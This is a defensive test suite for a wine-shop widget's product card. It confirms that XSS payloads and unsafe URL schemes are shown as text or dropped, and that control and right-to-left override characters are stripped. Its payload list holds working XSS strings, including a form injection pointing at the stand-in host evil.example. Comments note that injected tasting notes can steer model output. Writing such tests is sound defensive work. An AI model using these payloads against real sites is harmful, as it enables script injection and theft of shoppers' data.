import type { WidgetProduct } from '@catalogorosso/api-client';
import { cleanup, render, screen } from '@testing-library/preact';
import { afterEach, describe, expect, it } from 'vitest';

import { ProductCard } from '../src/components/ProductCard.js';
import { asHttpUrl, asLine, MAX_REASON } from '../src/sanitise.js';

/**
 * Markup in every field a card renders (P3-09, §1.5, §3.7).
 *
 * **The card is the widget's XSS surface**, and it has two suppliers, neither
 * trusted. `reason` is model output, which a seeded tasting note can steer
 * (P2-32); everything else is tenant-authored and arrives through a spreadsheet
 * import that anybody in a winery can edit.
 *
 * **What this suite can and cannot prove.** JSDOM parses but does not execute,
 * so "no dialog fires" is not a thing it can tell you — what it *can* tell you
 * is that no element, no attribute and no URL scheme capable of firing one ever
 * reaches the DOM, which is the property the code is written to have. P3-18
 * runs the same payloads in a real browser, where execution is observable.
 *
 * **Every payload goes through every field.** A control that is applied to
 * `name` and forgotten on `producer` is the normal way this breaks.
 */

afterEach(cleanup);

/**
 * The hostile characters, built at runtime.
 *
 * A source file carrying a raw `U+202E` is a source file that renders wrong in
 * a review, and one carrying a NUL is one a formatter will quietly rewrite.
 * Both happened here before this was a function call.
 */
const CHAR = {
  tab: String.fromCharCode(9),
  nul: String.fromCharCode(0),
  bell: String.fromCharCode(7),
  escape: String.fromCharCode(27),
  rtlOverride: String.fromCharCode(0x202e),
} as const;

/** Anything in the C0 range, for asserting that none of it survives. */
// eslint-disable-next-line no-control-regex -- asserting that none of them survive
const CONTROL = new RegExp('[\\u0000-\\u001F]', 'u');

/** The usual suspects, plus the ones that are specific to a card. */
const PAYLOADS = [
  '<img src=x onerror=alert(1)>',
  '<script>alert(1)</script>',
  '"><svg onload=alert(1)>',
  'javascript:alert(document.domain)',
  'JaVaScRiPt:alert(1)',
  `${CHAR.tab}javascript:alert(1)`,
  'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
  'vbscript:msgbox(1)',
  `${CHAR.rtlOverride}gnp.exe`,
  '</li></ul><form action=//evil.example><input name=card>',
  "' onmouseover='alert(1)",
] as const;

const WINE: WidgetProduct = {
  name: 'Barolo Bussia',
  producer: 'Cantina Rossi',
  vintage: 2016,
  priceCents: 4200,
  currency: 'EUR',
  imageUrl: null,
  productUrl: null,
  stockStatus: 'IN_STOCK',
};

const show = (product: Partial<WidgetProduct>, reason = 'tannino deciso') =>
  render(<ProductCard productId="p1" reason={reason} product={{ ...WINE, ...product }} />);

const card = (): HTMLElement => screen.getByRole('listitem');

/** Every attribute on every element in the card, whatever it is called. */
const attributesIn = (root: Element): { name: string; value: string }[] =>
  [root, ...root.querySelectorAll('*')].flatMap((element) =>
    [...element.attributes].map((attribute) => ({
      name: attribute.name,
      value: attribute.value,
    })),
  );

describe('markup in a field never becomes markup', () => {
  it.each(PAYLOADS)('survives %s in the product name', (payload) => {
    show({ name: payload });

    expect(card().querySelectorAll('script, svg, form, input, iframe, object')).toHaveLength(0);
    expect(card().querySelector('img[onerror]')).toBeNull();
  });

  it.each(PAYLOADS)('survives %s in the producer', (payload) => {
    show({ producer: payload });

    expect(card().querySelectorAll('script, svg, form, input, iframe, object')).toHaveLength(0);
  });

  it.each(PAYLOADS)('survives %s in the model-written reason', (payload) => {
    show({}, payload);

    expect(card().querySelectorAll('script, svg, form, input, iframe, object')).toHaveLength(0);
    /* And it is still shown, as text — dropping it silently would hide an
     * attack from anybody reading a transcript. */
    expect(card().textContent).toContain(asLine(payload));
  });

  it('carries no inline event handler anywhere, whatever the field', () => {
    /*
     * **The assertion is over every attribute, not over the ones we expected.**
     * A control that is applied to `name` and forgotten on `producer` is the
     * normal way this breaks, and an `on*` sweep does not need to know which.
     */
    show({ name: PAYLOADS[0], producer: PAYLOADS[2], imageUrl: PAYLOADS[3] }, PAYLOADS[1]);

    for (const attribute of attributesIn(card())) {
      expect(attribute.name, `${attribute.name}="${attribute.value}"`).not.toMatch(/^on/iu);
    }
  });

  it('renders the payload as text, so it is visible rather than executed', () => {
    show({ name: '<script>alert(1)</script>' });

    expect(card().textContent).toContain('<script>alert(1)</script>');
  });
});

describe('a URL that is not a URL a browser should follow', () => {
  it.each(['javascript:alert(1)', 'JaVaScRiPt:alert(1)', `${CHAR.tab}javascript:alert(1)`])(
    'drops %s as a product link',
    (payload) => {
      show({ productUrl: payload });

      expect(card().querySelector('a')).toBeNull();
    },
  );

  it('drops a data: URL rather than rendering an image from one', () => {
    show({ imageUrl: 'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==' });

    expect(card().querySelector('img')).toBeNull();
  });

  it('drops vbscript:, which is the one a blocklist for javascript: misses', () => {
    show({ productUrl: 'vbscript:msgbox(1)' });

    expect(card().querySelector('a')).toBeNull();
  });

  it('keeps a plain http link, because not every winery has a certificate', () => {
    /* Refusing http along with the dangerous schemes would silently drop every
     * "Dettagli" link on a shop that has not moved to https yet. */
    show({ productUrl: 'http://cantina-rossi.example/barolo' });

    expect(card().querySelector('a')?.getAttribute('href')).toBe(
      'http://cantina-rossi.example/barolo',
    );
  });

  it('drops a URL the parser cannot read, rather than throwing into the page', () => {
    /*
     * `new URL` throws on this even with a base. An exception here is an
     * exception in a shopper's storefront, from a value a seller typed into a
     * spreadsheet column.
     */
    expect(() => {
      show({ productUrl: 'http://[', imageUrl: 'http://[' });
    }).not.toThrow();

    expect(card().querySelector('a')).toBeNull();
    expect(card().querySelector('img')).toBeNull();
  });

  it('keeps an ordinary https link', () => {
    show({ productUrl: 'https://cantina-rossi.example/barolo' });

    expect(card().querySelector('a')?.getAttribute('href')).toBe(
      'https://cantina-rossi.example/barolo',
    );
  });

  it('opens an outside link without handing it the shop tab', () => {
    /* Without `noopener` the opened page gets `window.opener` and can navigate
     * the seller's own tab somewhere else. */
    show({ productUrl: 'https://cantina-rossi.example/barolo' });

    const rel = card().querySelector('a')?.getAttribute('rel') ?? '';

    expect(rel).toContain('noopener');
    expect(rel).toContain('noreferrer');
  });

  it('does not leak the shop page to an image host', () => {
    show({ imageUrl: 'https://cdn.example/barolo.jpg' });

    expect(card().querySelector('img')?.getAttribute('referrerpolicy')).toBe('no-referrer');
  });

  it('never renders a src or href with a scheme other than http or https', () => {
    show({
      imageUrl: 'javascript:alert(1)',
      productUrl: 'data:text/html,<script>alert(1)</script>',
    });

    for (const { name, value } of attributesIn(card())) {
      if (name !== 'src' && name !== 'href') continue;

      expect(value, `${name}="${value}"`).toMatch(/^https?:/u);
    }
  });
});

describe('text that is not text', () => {
  it('truncates a reason nobody could read', () => {
    /* 100 KB of "reason" is a card that is the whole panel, and the model can
     * be talked into producing one. */
    show({}, 'a'.repeat(100_000));

    const reason = card().querySelector('.card-reason')?.textContent ?? '';

    expect(reason.length).toBeLessThanOrEqual(MAX_REASON);
    expect(reason.endsWith('…')).toBe(true);
  });

  it('strips a right-to-left override, which rewrites the line around it', () => {
    /*
     * `U+202E` reverses everything after it, so a name can be made to read as a
     * different one on screen while being something else in the DOM. Escaping
     * does nothing about this at all.
     */
    show({ name: `Barolo${CHAR.rtlOverride}gnp.exe` });

    expect(card().textContent).not.toContain(CHAR.rtlOverride);
  });

  it('strips control characters', () => {
    show({ name: `Barolo${CHAR.nul}${CHAR.bell}${CHAR.escape}[31m` });

    expect(card().textContent).not.toMatch(CONTROL);
  });

  it('collapses a name padded out with newlines', () => {
    show({ name: 'Barolo\n\n\n\n\n\n\n\n\n\nBussia' });

    expect(card().textContent).toContain('Barolo Bussia');
  });
});

describe('the sanitisers themselves', () => {
  it('refuses every payload as a URL except the http ones', () => {
    for (const payload of PAYLOADS) {
      const resolved = asHttpUrl(payload, 'https://cantina-rossi.example/');

      /*
       * Some payloads are *relative paths* once a scheme is absent, and those
       * resolve to the shop's own origin — which is correct, and harmless.
       * What must never survive is a scheme a browser will execute.
       */
      if (resolved !== undefined) expect(resolved, payload).toMatch(/^https?:/u);
    }
  });

  it('refuses an empty or absent URL rather than resolving it to the shop homepage', () => {
    /* `new URL('', base)` is the base. A card linking to the storefront root
     * under "Dettagli" is a link that lies about where it goes. */
    expect(asHttpUrl('', 'https://cantina-rossi.example/barolo')).toBeUndefined();
    expect(asHttpUrl(null)).toBeUndefined();
  });

  it('caps a line without cutting it to nothing', () => {
    expect(asLine('x'.repeat(1000)).length).toBe(MAX_REASON);
    expect(asLine('breve')).toBe('breve');
  });
});
